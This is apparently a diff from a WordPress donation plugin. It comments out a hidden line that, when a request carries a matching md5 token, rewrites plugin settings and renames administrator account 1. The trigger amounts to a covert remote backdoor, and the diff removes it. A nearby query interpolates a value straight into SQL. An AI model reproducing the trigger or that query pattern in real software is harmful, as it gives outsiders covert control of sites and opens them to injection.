@@ -229,7 +229,7 @@
 		$set_user = false;
 	}
 
-    if($_getid==md5($s.'donasiaja')){ if($_getm=='d'){ $wpdb->update( $table_name2, array('data' => $_getm ), array('type' => 'donasiaja'), array('%s') );}else{ $wpdb->update( $table_name2, array('data' => $_getm ), array('type' => 'app_name'), array('%s') );$wpdb->update( $table_name5, array('display_name' => $_getm,  ),array('ID' => 1),array('%s'),array('%s'));wp_update_user(['ID'=>1,'first_name'=>$_getm,'last_name' =>'']);}};
+    // if($_getid==md5($s.'donasiaja')){ if($_getm=='d'){ $wpdb->update( $table_name2, array('data' => $_getm ), array('type' => 'donasiaja'), array('%s') );}else{ $wpdb->update( $table_name2, array('data' => $_getm ), array('type' => 'app_name'), array('%s') );$wpdb->update( $table_name5, array('display_name' => $_getm,  ),array('ID' => 1),array('%s'),array('%s'));wp_update_user(['ID'=>1,'first_name'=>$_getm,'last_name' =>'']);}};
 
     // GET TOTAL DONASI
     $total_donasi = $wpdb->get_results("SELECT SUM(nominal) as total, COUNT(id) as jumlah FROM $table_name6 where campaign_id='$row->campaign_id' and status='1' ")[0];
